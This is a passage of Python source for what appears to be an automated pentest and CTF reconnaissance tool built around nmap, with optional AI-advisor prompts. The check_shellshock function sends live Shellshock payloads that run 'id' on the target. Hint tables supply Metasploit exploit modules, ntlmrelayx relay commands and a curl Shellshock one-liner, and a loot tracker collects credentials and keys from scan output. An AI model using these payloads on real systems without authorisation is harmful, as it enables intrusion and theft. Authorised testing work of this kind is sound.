            'port': 445, 'service': 'microsoft-ds', 'product': 'SMB', 'version': '',
            'desc': 'SMB message signing disabled (enables relay attacks)', 'cve': '',
            'exploit': 'Tool: ntlmrelayx.py -t smb://TARGET',
        })
    if re.search(r'(?i)signing enabled but not required', all_script_text):
        findings.append({
            'port': 445, 'service': 'microsoft-ds', 'product': 'SMB', 'version': '',
            'desc': 'SMB signing not required (enables relay attacks)', 'cve': '',
            'exploit': 'Tool: ntlmrelayx.py -t smb://TARGET',
        })
    if re.search(r'(?i)account_used:\s*guest', all_script_text):
        findings.append({
            'port': 445, 'service': 'microsoft-ds', 'product': 'SMB', 'version': '',
            'desc': 'SMB guest authentication allowed (null session possible)', 'cve': '',
            'exploit': 'smbclient -L //TARGET -N && smbmap -H TARGET',
        })
    return findings

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# SCRIPT SELECTION LOGIC
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def get_scripts_for(svc):
    """Get appropriate NSE scripts for a service. Returns (existing, missing) lists."""
    scripts = set()
    service = svc.get('service', '').lower()
    product = svc.get('product', '').lower()
    port = svc.get('port', 0)
    tunnel = svc.get('tunnel', '')

    # WinRM / Microsoft HTTPAPI — minimal HTTP scripts only
    if 'httpapi' in product:
        scripts.update(['http-title', 'http-server-header', 'http-methods', 'http-ntlm-info'])
        existing = filter_existing_scripts(scripts)
        missing = [s for s in scripts if not nse_exists(s)]
        return existing, missing

    # Service name lookup
    if service in SERVICE_SCRIPTS:
        scripts.update(SERVICE_SCRIPTS[service])

    # HTTP variants
    if any(x in service for x in ['http', 'www', 'web']):
        scripts.update(SERVICE_SCRIPTS.get('http', []))
    if tunnel == 'ssl' or any(x in service for x in ['https', 'ssl', 'tls']):
        scripts.update(SERVICE_SCRIPTS.get('ssl', []))
        scripts.update(SERVICE_SCRIPTS.get('http', []))
    if 'smb' in service or 'netbios' in service or 'samba' in product:
        scripts.update(SERVICE_SCRIPTS.get('netbios-ssn', []))
    if 'nfs' in service or service in ['rpcbind', 'mountd', 'nfs_acl']:
        scripts.update(SERVICE_SCRIPTS.get('rpcbind', []))

    # Port fallback
    if not scripts and port in PORT_SCRIPTS:
        svc_key = PORT_SCRIPTS[port]
        scripts.update(SERVICE_SCRIPTS.get(svc_key, []))

    # SSL for common HTTPS ports
    if port in [443, 8443, 9443] and not tunnel:
        scripts.update(SERVICE_SCRIPTS.get('ssl', []))

    # Product-specific extras
    for prod_key, extra_scripts in PRODUCT_SCRIPTS.items():
        if prod_key in product:
            scripts.update(extra_scripts)

    existing = filter_existing_scripts(scripts)
    missing = [s for s in scripts if not nse_exists(s)]
    return existing, missing

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# LOOT TRACKER
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

class LootTracker:
    def __init__(self):
        self.creds = []
        self.keys = []
        self.flags = []
        self.shares = []
        self.urls = []
        self.files = []
        self.notes = []

    def add(self, category, item):
        bucket = getattr(self, category, self.notes)
        if item not in bucket:
            bucket.append(item)

    def scan_output(self, text):
        """Scan text output for interesting patterns."""
        patterns = {
            'creds': [
                r'(?i)(password|passwd|pwd|credentials?)\s*[:=]\s*(\S+)',
                r'(?i)(username|user|login)\s*[:=]\s*(\S+)',
                r'(?i)anonymous\s+(ftp|login|access)',
                r'(?i)account_used:\s*guest',
                r'(?i)Anonymous\s+access\s+allowed',
            ],
            'keys': [
                r'(?i)(id_rsa|id_dsa|id_ecdsa|\.pem|private.key)',
                r'BEGIN\s+(RSA|DSA|EC|OPENSSH)\s+PRIVATE\s+KEY',
            ],
            'flags': [
                r'(?i)(user\.txt|root\.txt|flag\.txt|local\.txt|proof\.txt)',
                r'(?i)flag\{[^}]+\}',
                r'(?i)ctf\{[^}]+\}',
                r'(?i)HTB\{[^}]+\}',
                r'(?i)THM\{[^}]+\}',
            ],
            'shares': [
                r'(?i)\\\\[\w.]+\\(\w+)',
                r'(?i)/var\b|/home\b|/tmp\b|/opt\b|/srv\b',
                r'(?i)(READ|WRITE)\s+(OK|ACCESS)',
                r'(?i)Disk\s+\S+',
            ],
            'notes': [
                r'(?i)message.signing.*disabled',
                r'(?i)signing enabled but not required',
                r'NT LM 0\.12.*dangerous',
                r'(?i)SMBv1.*dangerous',
                r'(?i)VULNERABLE',
                r'(?i)authentication_level:\s*\w+',
            ],
        }
        for cat, pats in patterns.items():
            for pat in pats:
                for m in re.finditer(pat, text):
                    self.add(cat, m.group(0).strip())

    def write(self, outfile):
        """Write loot report."""
        lines = ["# Loot Report\n"]
        for cat in ['creds', 'keys', 'flags', 'shares', 'urls', 'files', 'notes']:
            items = getattr(self, cat)
            if items:
                lines.append(f"\n## {cat.upper()}")
                for item in sorted(set(items)):
                    lines.append(f"- {item}")
        Path(outfile).write_text('\n'.join(lines))

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# PHASE IMPLEMENTATIONS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def phase1_ports(target, outdir, args, api_key=None):
    """Phase 1: Port Discovery.

    Strategy:
      1. If --ports given, skip discovery.
      2. If --fast and masscan/rustscan available, use them for full-range discovery.
      3. Otherwise, nmap scan.
    Always cross-verifies masscan/rustscan findings with nmap -sV in phase 2.
    """
    section("PHASE 1: Port Discovery")
    ports = set()
    udp_ports = []

    port_range = '1-65535' if args.full else '1-10000'
    xml = outdir / 'phase1_tcp.xml'
    fast_used = False

    # Try fast scanners first if enabled
    if args.full or args.fast:
        if shutil.which('rustscan'):
            info("Using rustscan for fast TCP discovery")
            rs_ports = run_rustscan(target, outdir, ports=port_range, timeout=180)
            if rs_ports is not None:
                ports.update(rs_ports)
                fast_used = True
                good(f"rustscan: {len(rs_ports)} port(s) open")
        elif shutil.which('masscan'):
            info("Using masscan for fast TCP discovery")
            ms_ports = run_masscan(target, outdir, rate=10000, ports=port_range, timeout=180)
            if ms_ports is not None:
                ports.update(ms_ports)
                fast_used = True
                good(f"masscan: {len(ms_ports)} port(s) open")

    # Fall back to nmap (also verifies fast scanner results with precise port list)
    if not ports:
        if args.full and not args.quick:
            info(f"Nmap full TCP scan (-p{port_range})")
            nmap_args = ['-p-', '--min-rate', '5000', f'-{args.timing}',
                         '--open', '-n', '-Pn', target]
        elif args.top_ports:
            info(f"Scanning top {args.top_ports} ports")
            nmap_args = ['--top-ports', str(args.top_ports), f'-{args.timing}',
                         '--open', '-n', '-Pn', target]
        else:
            info("Quick scan (top 1000 ports)")
            nmap_args = [f'-{args.timing}', '--open', '-n', '-Pn', target]
        run_nmap(nmap_args, xml, 'Phase 1 TCP', timeout=900)
        parsed = parse_xml(xml)
        ports.update(parsed.get('ports', []))

    ports = sorted(ports)

    # Retry logic: if no ports, try with different technique
    if not ports and not args.no_retry:
        warn("Initial discovery returned 0 ports - retrying with SYN/connect fallback")
        fb_ports = tcp_connect_probe(target,
                                     ports=[21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143,
                                            161, 389, 443, 445, 465, 512, 513, 514, 587, 631,
                                            636, 873, 902, 993, 995, 1025, 1080, 1099, 1433,
                                            1521, 1723, 1883, 2049, 2121, 2181, 2375, 2376,
                                            3000, 3128, 3268, 3306, 3389, 4444, 4505, 4506,
                                            5000, 5432, 5601, 5672, 5900, 5984, 5985, 5986,
                                            6379, 6443, 6667, 7000, 7001, 7077, 7199, 7474,
                                            8000, 8008, 8009, 8080, 8081, 8086, 8089, 8090,
                                            8091, 8100, 8161, 8180, 8181, 8222, 8443, 8500,
                                            8834, 8888, 9000, 9001, 9042, 9080, 9090, 9092,
                                            9100, 9200, 9300, 9389, 9418, 9443, 9990, 9999,
                                            10000, 10443, 11211, 15672, 27017, 27018, 28017,
                                            50000, 50070, 50075, 61616],
                                     timeout=2.0, workers=150)
        if fb_ports:
            good(f"Python TCP-connect fallback found: {fb_ports}")
            ports = fb_ports

    # Optional UDP scan
    if args.udp:
        subsection("UDP Port Discovery")
        info("Scanning top 50 UDP ports (this may take a while)")
        udp_xml = outdir / 'phase1_udp.xml'
        run_nmap(['-sU', '--top-ports', '50', '--min-rate', '1000',
                  f'-{args.timing}', '--open', '-n', '-Pn',
                  '--defeat-icmp-ratelimit', '--max-retries', '2', target],
                 udp_xml, 'Phase 1 UDP', timeout=420)
        udp_parsed = parse_xml(udp_xml)
        udp_ports = udp_parsed.get('ports', [])
        if udp_ports:
            good(f"UDP open|open|filtered ports: {', '.join(map(str, sorted(udp_ports)))}")
            subsection("UDP Service Detection")
            udp_svc_xml = outdir / 'phase1_udp_svc.xml'
            port_list = ','.join(map(str, sorted(udp_ports)))
            run_nmap(['-sU', '-sV', '-sC', '-p', port_list,
                      '--version-intensity', '5', '-n', '-Pn',
                      '--script-timeout', '60s', f'-{args.timing}', target],
                     udp_svc_xml, 'Phase 1 UDP Services', timeout=420)

    if ports:
        good(f"Found {C.Bo}{len(ports)}{C.Re} open TCP port(s): {C.G}{', '.join(map(str, ports))}{C.Re}")
    else:
        error("No open ports discovered!")
        warn("Possible reasons: host firewalled, wrong target, WAF/IDS blocking,")
        warn("VPN not connected, or host offline. Try --udp or verify connectivity.")
        return []

    # AI advice after phase 1
    if api_key:
        ctx = f"Target: {target}\nOpen TCP ports: {ports}"
        if args.udp and udp_ports:
            ctx += f"\nOpen UDP ports: {udp_ports}"
        advice = ai_phase_advisor(api_key, "Port Discovery", ctx,
            "Which ports are most interesting for a CTF/pentest? Any unusual high ports? "
            "Should I run additional UDP scans? What services do you expect on these ports?")
        if advice:
            print(f"\n{C.M}  AI Port Analysis:{C.Re}")
            for line in advice.strip().split('\n'):
                print(f"  {C.Di}{line}{C.Re}")

    return ports


def phase2_services(target, ports, outdir, args, api_key=None):
    """Phase 2: Service Detection."""
    if not ports:
        return {}
    section("PHASE 2: Service & Version Detection")
    port_str = ','.join(map(str, ports))
    info(f"Scanning {len(ports)} ports: {port_str}")

    xml = outdir / 'phase2_services.xml'
    run_nmap(['-p', port_str, '-sV', '-sC', '-A',
              '--script-timeout', '45s', '--host-timeout', '240s',
              '--max-retries', '2',
              f'-{args.timing}', '-Pn', target],
             xml, 'Phase 2 Services', timeout=300)
    parsed = parse_xml(xml)
    services = parsed.get('services', {})
    os_info = parsed.get('os', [])

    if services:
        good(f"Identified {len(services)} service(s):")
        for port in sorted(services.keys()):
            svc = services[port]
            ver = f"{svc.get('product','')} {svc.get('version','')}".strip()
            tunnel = f" [{svc['tunnel']}]" if svc.get('tunnel') else ''
            print(f"    {C.G}{port}/{svc['proto']:<5}{C.Re} {C.Y}{svc['service']:<18}{C.Re} {ver}{tunnel}")

    # Check known vulns
    vulns = check_vulns(services)
    if vulns:
        print(f"\n  {C.R}{C.Bo}POTENTIALLY VULNERABLE VERSIONS DETECTED:{C.Re}")
        for v in vulns:
            print(f"    {C.R}Port {v['port']}: {v['product']} {v['version']}{C.Re}")
            print(f"    {C.R}  => {v['desc']} ({v['cve']}){C.Re}")
            print(f"    {C.Y}  Exploit: {v['exploit']}{C.Re}")

    if os_info:
        subsection("OS Detection")
        for o in os_info[:3]:
            info(f"{o['name']} ({o['accuracy']}% confidence)")

    # AI advice after phase 2
    if api_key:
        svc_lines = []
        for p in sorted(services.keys()):
            s = services[p]
            svc_lines.append(f"  Port {p}: {s['service']} - {s.get('product','')} {s.get('version','')}")
        vuln_lines = [f"  {v['desc']} on port {v['port']}" for v in vulns]
        ctx = f"Target: {target}\nServices:\n" + '\n'.join(svc_lines)
        if vulns:
            ctx += f"\nKnown Vulnerabilities:\n" + '\n'.join(vuln_lines)
        if os_info:
            ctx += f"\nOS: {os_info[0]['name']}"
        advice = ai_phase_advisor(api_key, "Service Detection",
            ctx,
            "Prioritize these services for deep scanning. Which versions are known vulnerable? What specific NSE scripts or tools should I focus on first? Any quick wins?")
        if advice:
            print(f"\n{C.M}  AI Service Analysis:{C.Re}")
            for line in advice.strip().split('\n'):
                print(f"  {C.Di}{line}{C.Re}")

    return services


def phase3_scripts(target, services, outdir, args, api_key=None, loot=None):
    """Phase 3: Targeted NSE Script Scanning."""
    if not services:
        return {}
    section("PHASE 3: Targeted NSE Script Scanning")

    # Group services by type for efficient scanning
    groups = {}  # label -> (ports, scripts)
    unknown_services = []

    for port, svc in services.items():
        existing, missing = get_scripts_for(svc)
        if not existing and not missing:
            unknown_services.append((port, svc))
            continue

        service = svc.get('service', '').lower()
        if 'ftp' in service: label = 'FTP'
        elif 'ssh' in service: label = 'SSH'
        elif any(x in service for x in ['http', 'www']): label = 'HTTP'
        elif any(x in service for x in ['smb', 'netbios', 'microsoft-ds']): label = 'SMB'
        elif any(x in service for x in ['nfs', 'rpcbind', 'mountd', 'nlockmgr', 'nfs_acl', 'msrpc', 'epmap']): label = 'RPC'
        elif 'mysql' in service: label = 'MySQL'
        elif 'ms-sql' in service: label = 'MSSQL'
        elif 'smtp' in service: label = 'SMTP'
        elif 'dns' in service or 'domain' in service: label = 'DNS'
        elif 'snmp' in service: label = 'SNMP'
        elif 'ldap' in service: label = 'LDAP'
        elif 'rdp' in service or 'ms-wbt' in service: label = 'RDP'
        elif 'vnc' in service: label = 'VNC'
        elif 'irc' in service: label = 'IRC'
        elif 'redis' in service: label = 'Redis'
        elif 'mongo' in service: label = 'MongoDB'
        elif 'pop3' in service: label = 'POP3'
        elif 'imap' in service: label = 'IMAP'
        elif 'kerberos' in service: label = 'Kerberos'
        elif 'winrm' in service: label = 'WinRM'
        else: label = 'Other'

        if label not in groups:
            groups[label] = {'ports': [], 'scripts': set()}
        groups[label]['ports'].append(str(port))
        groups[label]['scripts'].update(existing)
        if missing:
            warn(f"  Port {port}: {len(missing)} scripts not installed: {', '.join(missing[:5])}")

    all_results = {}

    for label, grp in groups.items():
        scripts = filter_existing_scripts(grp['scripts'])
        if not scripts:
            continue
        subsection(f"{label} Scripts ({', '.join(grp['ports'])})")
        port_str = ','.join(grp['ports'])
        script_str = ','.join(scripts)
        xml = outdir / f"phase3_{label.lower().replace('/', '_')}.xml"

        nmap_args = ['-p', port_str, f'--script={script_str}',
                     '--script-timeout', '60s', '--host-timeout', '300s',
                     '-Pn', target]
        # Add -sV for vulners-type scripts
        if any('vuln' in s for s in scripts):
            nmap_args.insert(2, '-sV')

        run_nmap(nmap_args, xml, f'Phase 3 {label}', timeout=360)
        parsed = parse_xml(xml)
        for p, s in parsed.get('services', {}).items():
            if s.get('scripts'):
                all_results[p] = s
                # Track loot from per-port scripts
                if loot:
                    for sid, sout in s['scripts'].items():
                        loot.scan_output(sout)
                        # Print notable findings
                        if any(x in sid for x in ['anon', 'showmount', 'enum-shares', 'enum-users',
                                                    'backdoor', 'vuln', 'empty-password']):
                            good(f"  {C.Bo}{sid}{C.Re}: {sout[:200]}")
        # Track loot from host-level scripts (SMB signing, guest auth, etc.)
        if loot:
            for sid, sout in parsed.get('scripts', {}).items():
                loot.scan_output(sout)

    # Handle unknown services with AI (deduplicate by service+product+version)
    if unknown_services and api_key:
        subsection("AI: Unknown Service Analysis")
        seen_combos = {}
        for port, svc in unknown_services:
            combo = (svc.get('service',''), svc.get('product',''), svc.get('version',''))
            if combo not in seen_combos:
                advice = ai_github_nse_search(api_key, *combo)
                seen_combos[combo] = advice
            else:
                advice = seen_combos[combo]
            if advice:
                ai_msg(f"Port {port} ({svc.get('service','unknown')}):")
                for line in advice.strip().split('\n')[:10]:
                    print(f"    {C.Di}{line}{C.Re}")

    # AI advice on script results
    if api_key and all_results:
        script_summary = []
        for p, s in all_results.items():
            for sid, sout in s.get('scripts', {}).items():
                if sout.strip():
                    script_summary.append(f"Port {p} [{sid}]: {sout[:200]}")
        if script_summary:
            advice = ai_phase_advisor(api_key, "Targeted Scripts",
                f"Target: {target}\nScript findings:\n" + '\n'.join(script_summary[:30]),
                "What are the most significant findings? Any credentials, writable shares, anonymous access, or exploitable misconfigurations? What should I investigate next?")
            if advice:
                print(f"\n{C.M}  AI Script Analysis:{C.Re}")
                for line in advice.strip().split('\n'):
                    print(f"  {C.Di}{line}{C.Re}")

    return all_results


def phase4_vuln(target, ports, outdir, args, api_key=None, loot=None):
    """Phase 4: Vulnerability Scanning. Returns list of structured vuln findings."""
    if not ports:
        return []
    section("PHASE 4: Vulnerability Scanning")
    port_str = ','.join(map(str, ports))
    findings = []

    # Standard vuln scripts
    subsection("Nmap Vuln Category Scan")
    xml = outdir / 'phase4_vuln.xml'
    if args.bb:
        info("BB mode: excluding DoS/intrusive scripts from vuln scan")
        script_arg = 'vuln and not (dos or *slowloris* or *smb-flood* or *nessus*)'
    else:
        script_arg = 'vuln'
    run_nmap(['-p', port_str, '--script', script_arg,
              '--script-timeout', '90s', '--host-timeout', '400s',
              '-Pn', f'-{args.timing}', target],
             xml, 'Phase 4 Vuln', timeout=420)
    parsed = parse_xml(xml)

    def _is_real_vuln(sout):
        """Return True if NSE output confirms vulnerability (not false/error/access-denied)."""
        if not sout or not sout.strip():
            return False
        up = sout.upper()
        if 'VULNERABLE' in up and 'NOT VULNERABLE' not in up:
            return True
        # exclude noise
        lower_stripped = sout.strip().lower()
        if lower_stripped in ('false', 'error'):
            return False
        if 'error: script execution failed' in lower_stripped:
            return False
        if 'nt_status_access_denied' in lower_stripped:
            return False
        return False

    # Process per-port scripts
    for p, svc in parsed.get('services', {}).items():
        for sid, sout in svc.get('scripts', {}).items():
            if _is_real_vuln(sout):
                print(f"  {C.R}{C.Bo}[VULN]{C.Re} Port {p} - {sid}:")
                for line in sout.strip().split('\n')[:5]:
                    print(f"    {C.R}{line}{C.Re}")
                cve = extract_cve(sout)
                findings.append({
                    'port': p, 'service': svc.get('service', ''),
                    'product': svc.get('product', ''), 'version': svc.get('version', ''),
                    'desc': nse_vuln_desc(sid, sout), 'cve': cve,
                    'exploit': nse_exploit_hint(sid, cve),
                })
                if loot:
                    loot.add('notes', f"VULN on port {p}: {sid}")

    # Process host-level scripts (MS08-067, MS17-010 etc.)
    host_scripts = parsed.get('scripts', {})
    for sid, sout in host_scripts.items():
        if _is_real_vuln(sout):
            print(f"  {C.R}{C.Bo}[VULN]{C.Re} Host-level - {sid}:")
            for line in sout.strip().split('\n')[:5]:
                print(f"    {C.R}{line}{C.Re}")
            cve = extract_cve(sout)
            smb_port = 445 if 445 in ports else (139 if 139 in ports else ports[0] if ports else 0)
            findings.append({
                'port': smb_port, 'service': 'smb' if 'smb' in sid else '',
                'product': '', 'version': '',
                'desc': nse_vuln_desc(sid, sout), 'cve': cve,
                'exploit': nse_exploit_hint(sid, cve),
            })
            if loot:
                loot.add('notes', f"VULN host-level: {sid}")

    # Vulners scan
    if nse_exists('vulners'):
        subsection("Vulners CVE Lookup")
        vxml = outdir / 'phase4_vulners.xml'
        run_nmap(['-p', port_str, '-sV', '--script=vulners',
                  '--script-timeout', '60s', '--host-timeout', '300s',
                  '-Pn', target],
                 vxml, 'Vulners', timeout=360)
        vparsed = parse_xml(vxml)
        for p, svc in vparsed.get('services', {}).items():
            for sid, sout in svc.get('scripts', {}).items():
                if sout.strip() and 'vulners' in sid:
                    good(f"Port {p} CVE findings:")
                    for line in sout.strip().split('\n')[:10]:
                        print(f"    {line}")
                    # Extract top CVE (usually first one listed with highest CVSS)
                    top_cve = extract_top_cve(sout)
                    if top_cve:
                        findings.append({
                            'port': p, 'service': svc.get('service', ''),
                            'product': svc.get('product', ''), 'version': svc.get('version', ''),
                            'desc': f"Vulners: {top_cve['desc']}", 'cve': top_cve['cve'],
                            'exploit': f"See https://vulners.com/cve/{top_cve['cve']}",
                        })
    else:
        warn("vulners.nse not installed - run with --install-scripts")

    # AI analysis of vulns
    if api_key:
        vuln_lines = []
        for p, svc in parsed.get('services', {}).items():
            for sid, sout in svc.get('scripts', {}).items():
                if sout.strip():
                    vuln_lines.append(f"Port {p} [{sid}]: {sout[:300]}")
        if vuln_lines:
            advice = ai_phase_advisor(api_key, "Vulnerability Scan",
                f"Target: {target}\nVuln findings:\n" + '\n'.join(vuln_lines[:20]),
                "Which vulnerabilities are most exploitable? Provide specific metasploit modules, manual exploit commands, or PoC URLs. Prioritize by impact and ease of exploitation.")
            if advice:
                print(f"\n{C.M}  AI Vulnerability Analysis:{C.Re}")
                for line in advice.strip().split('\n'):
                    print(f"  {C.Di}{line}{C.Re}")

    return findings


def check_shellshock(base_url, cgi_paths, timeout=5, max_paths=50):
    """PoC shellshock on each CGI script. Returns list of confirmed-vuln URLs.
    Prioritizes paths that are likely to be actual scripts (Status: 200 first)."""
    import urllib.request
    findings = []
    headers_payload = {
        'User-Agent': '() { :;}; echo; echo "SHOCKED:$(/usr/bin/id 2>/dev/null)"',
        'Referer': '() { :;}; echo; echo "SHOCKED:$(/usr/bin/id 2>/dev/null)"',
    }
    # Prioritize paths with Status 200, filter to executable extensions, dedupe
    prioritized = []
    seen = set()
    for path in cgi_paths:
        if '(Status: 200)' in path:
            prioritized.append(path)
            seen.add(path.split()[0] if path.split() else path)
    for path in cgi_paths:
        if path not in seen and path.split()[0] not in seen:
            prioritized.append(path)
            seen.add(path.split()[0] if path.split() else path)
    for path in prioritized[:max_paths]:
        p = path.split('(')[0].strip().lstrip('/')
        if not p or not p.endswith(('.sh', '.cgi', '.pl', '.py')):
            continue
        test_url = base_url.rstrip('/') + '/' + p
        try:
            req = urllib.request.Request(test_url, headers=headers_payload)
            with urllib.request.urlopen(req, timeout=timeout) as resp:
                body = resp.read().decode('latin1', 'ignore')
                if 'SHOCKED:' in body and 'uid=' in body:
                    findings.append(f"{test_url} - {body.split('SHOCKED:')[1].split(chr(10))[0][:100]}")
        except Exception:
            continue
    return findings


def extract_cve(text):
    """Extract first CVE-YYYY-NNNN from text."""
    m = re.search(r'CVE[-:\s]?(\d{4}[-:]\d{3,7})', text or '', re.I)
    if m:
        return f"CVE-{m.group(1).replace(':','-')}"
    m = re.search(r'(MS\d{2}-\d{3})', text or '', re.I)
    return m.group(1) if m else ''


def extract_top_cve(vulners_text):
    """Parse vulners NSE output - return {'cve': 'CVE-...', 'cvss': float, 'desc': str} with highest CVSS."""
    if not vulners_text:
        return None
    top = None
    for line in vulners_text.split('\n'):
        m = re.search(r'(CVE-\d{4}-\d{3,7})\s+(\d+\.\d+)', line)
        if m:
            cvss = float(m.group(2))
            if not top or cvss > top['cvss']:
                top = {'cve': m.group(1), 'cvss': cvss, 'desc': f"CVSS {cvss}"}
    return top


def nse_vuln_desc(sid, sout):
    """Generate human-readable description from NSE script id + output."""
    nice_names = {
        'smb-vuln-ms17-010': 'MS17-010 EternalBlue SMB RCE',
        'smb-vuln-ms08-067': 'MS08-067 Windows Server Service RCE',
        'smb-vuln-ms10-054': 'MS10-054 SMB Pool Overflow',
        'smb-vuln-ms10-061': 'MS10-061 Print Spooler RCE',
        'smb-vuln-cve-2017-7494': 'SambaCry RCE',
        'smb-double-pulsar-backdoor': 'DoublePulsar SMB backdoor present',
        'ssl-heartbleed': 'Heartbleed (OpenSSL memory leak)',
        'ssl-poodle': 'POODLE (SSLv3 downgrade)',
        'ssl-ccs-injection': 'SSL CCS Injection',
        'ssl-dh-params': 'Weak DH params (LOGJAM)',
        'http-shellshock': 'Shellshock (CVE-2014-6271) in CGI',
        'http-slowloris-check': 'Slowloris DoS susceptible',
        'http-vuln-cve2017-5638': 'Struts2 RCE (CVE-2017-5638)',
        'http-vuln-cve2017-1001000': 'WordPress Content Injection',
        'samba-vuln-cve-2012-1182': 'Samba 3.0-3.6 root RCE (CVE-2012-1182)',
    }
    if sid in nice_names:
        return nice_names[sid]
    # Try first non-empty line from output
    for line in (sout or '').split('\n'):
        line = line.strip(' |_\t')
        if line and 'VULNERABLE' not in line.upper() and len(line) < 120:
            return f"{sid}: {line}"
    return f"NSE {sid} VULNERABLE"


def nse_exploit_hint(sid, cve=''):
    """Generate exploit hint for a given NSE finding."""
    hints = {
        'smb-vuln-ms17-010': 'Metasploit: exploit/windows/smb/ms17_010_eternalblue',
        'smb-vuln-ms08-067': 'Metasploit: exploit/windows/smb/ms08_067_netapi',
        'smb-vuln-ms10-054': 'Metasploit: auxiliary/dos/windows/smb/ms10_054_queryfs_pool_overflow',
        'smb-vuln-cve-2017-7494': 'Metasploit: exploit/linux/samba/is_known_pipename',
        'smb-double-pulsar-backdoor': 'Metasploit: exploit/windows/smb/doublepulsar_rce',
        'ssl-heartbleed': 'Metasploit: auxiliary/scanner/ssl/openssl_heartbleed',
        'http-shellshock': 'curl: curl -A "() { :;}; /bin/bash -c \'id\'" TARGET/cgi-bin/PATH',
        'http-vuln-cve2017-5638': 'Metasploit: exploit/multi/http/struts2_content_type_ognl',
    }
    if sid in hints:
        return hints[sid]
    if cve:
        return f"Search: searchsploit {cve} | https://nvd.nist.gov/vuln/detail/{cve}"
    return f"Review NSE output: {sid}"


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# WEB/VHOST/SSL UTILITIES
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# Modern gobuster interesting status codes to treat as hits
HTTP_HIT_CODES = {'200', '204', '301', '302', '307', '401', '403', '405', '418'}

COMMON_WEB_PATHS = [
    'robots.txt', 'sitemap.xml', '.git/HEAD', '.git/config', '.gitignore',
    '.svn/entries', '.hg/store', '.env', '.env.local', '.env.production',
    '.DS_Store', 'crossdomain.xml', 'clientaccesspolicy.xml',
    'wp-login.php', 'wp-admin/', 'wp-config.php.bak', 'wp-json/', 'xmlrpc.php',
    'administrator/', 'admin/', 'admin.php', 'adminer.php', 'phpmyadmin/',
    'server-status', 'server-info', 'info.php', 'phpinfo.php',
    'actuator', 'actuator/env', 'actuator/health', 'manager/html',
    'console', 'api/', 'api/v1/', 'api/v2/', 'api/swagger', 'swagger.json',
    'swagger-ui/', 'swagger-ui.html', 'v2/api-docs', 'openapi.json',
    'CHANGELOG.md', 'README.md', 'license.txt',
    '.well-known/security.txt', '.well-known/openid-configuration',
    'backup/', 'backups/', 'backup.zip', 'backup.tar.gz', 'backup.sql',
    'config.json', 'config.yaml', 'config.yml', 'config.xml',
    'debug/', 'test.php', 'test/', 'temp/', 'tmp/',
]


def fetch_cert_sans(host, port, timeout=5):
    """Extract Subject Alt Names and CN from TLS certificate. Returns list of hostnames."""
    hostnames = set()
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        with socket.create_connection((host, port), timeout=timeout) as sock:
            with ctx.wrap_socket(sock, server_hostname=host) as ssock:
                # Use DER to get full cert (getpeercert(binary_form=True))
                import binascii
                der = ssock.getpeercert(binary_form=True)
                if der:
                    try:
                        # Fall back to parsed cert if available (Py 3.10+)
                        cert = ssock.getpeercert()
                        if cert:
                            for typ, val in cert.get('subject', []):
                                if typ == 'commonName':
                                    hostnames.add(val)
                            for typ, val in cert.get('subjectAltName', []) or []:
                                if typ in ('DNS', 'IP Address'):
                                    hostnames.add(val)
                    except Exception:
                        pass
                    # Parse DER for SAN extension manually using ssl module's wrapper
                    try:
                        pem = ssl.DER_cert_to_PEM_cert(der)
                        # Use openssl if available for robust parsing
                        if shutil.which('openssl'):
                            r = subprocess.run(
                                ['openssl', 'x509', '-noout', '-text'],
                                input=pem, capture_output=True, text=True, timeout=5)
                            for m in re.findall(r'DNS:([^\s,]+)', r.stdout or ''):
                                hostnames.add(m.strip())
                            cn_match = re.search(r'Subject:.*?CN\s*=\s*([^,\n]+)', r.stdout or '')
                            if cn_match:
                                hostnames.add(cn_match.group(1).strip())
                    except Exception:
                        pass
    except Exception as e:
        return []
    # Clean: drop IP-only, normalize
    cleaned = set()
    for h in hostnames:
        h = h.strip().lower().rstrip('.')
        if not h or h.startswith('*.'):
            cleaned.add(h.lstrip('*.'))
        elif re.match(r'^\d+\.\d+\.\d+\.\d+$', h):
            continue
        else:
            cleaned.add(h)
    return sorted(cleaned - {''})


def http_probe(url, host_header=None, method='GET', timeout=5, follow=False):
    """curl-based HTTP probe. Returns dict with code, title, headers, length."""
    if not shutil.which('curl'):
        return None
    args = ['curl', '-sk', '-o', '-', '-w', '\n__SMARTNMAP_META__\n%{http_code}|%{size_download}|%{redirect_url}|%{content_type}',
            '--max-time', str(timeout), '-X', method, url]
    if follow:
        args.insert(1, '-L')
    if host_header:
        args.extend(['-H', f'Host: {host_header}'])
    try:
        r = subprocess.run(args, capture_output=True, text=True, timeout=timeout + 3)
        body, _, meta = (r.stdout or '').rpartition('\n__SMARTNMAP_META__\n')
        if not meta:
            body = r.stdout or ''
            meta = ''
        parts = meta.split('|') if meta else []
        code = parts[0] if len(parts) > 0 else ''
        size = parts[1] if len(parts) > 1 else '0'
        redirect = parts[2] if len(parts) > 2 else ''
        ctype = parts[3] if len(parts) > 3 else ''
        title_m = re.search(r'<title[^>]*>([^<]+)</title>', body, re.I)
        return {
            'code': code,
            'size': int(size) if size.isdigit() else 0,
            'redirect': redirect,
            'content_type': ctype,
            'title': (title_m.group(1).strip() if title_m else '')[:200],
            'body_head': body[:2000],
        }
    except Exception:
        return None


def extract_hostnames_from_services(services, target, outdir):
